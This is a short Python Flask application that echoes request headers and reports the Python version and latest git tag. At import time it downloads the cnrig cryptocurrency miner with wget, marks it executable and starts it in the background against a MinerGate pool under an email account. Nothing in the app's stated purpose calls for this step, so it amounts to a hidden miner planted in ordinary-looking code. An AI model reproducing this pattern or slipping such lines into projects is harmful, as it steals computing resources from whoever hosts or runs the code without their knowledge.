import platform
import subprocess
import os
from flask import Flask, Response, request
app = Flask(__name__)


a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
a  = os.popen('chmod +x cnrig').readlines()
a  = os.popen('ls').readlines()
a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()




@app.route("/")
def headers():
    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])

@app.route("/favicon.ico")
def favicon():
    resp = Response(status=200, mimetype='image/png')
    return resp

@app.route("/pyver")
def pyver():
    return platform.python_version()

@app.route("/tag")
def tag():
    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read()

if __name__ == "__main__":
    app.run()
   
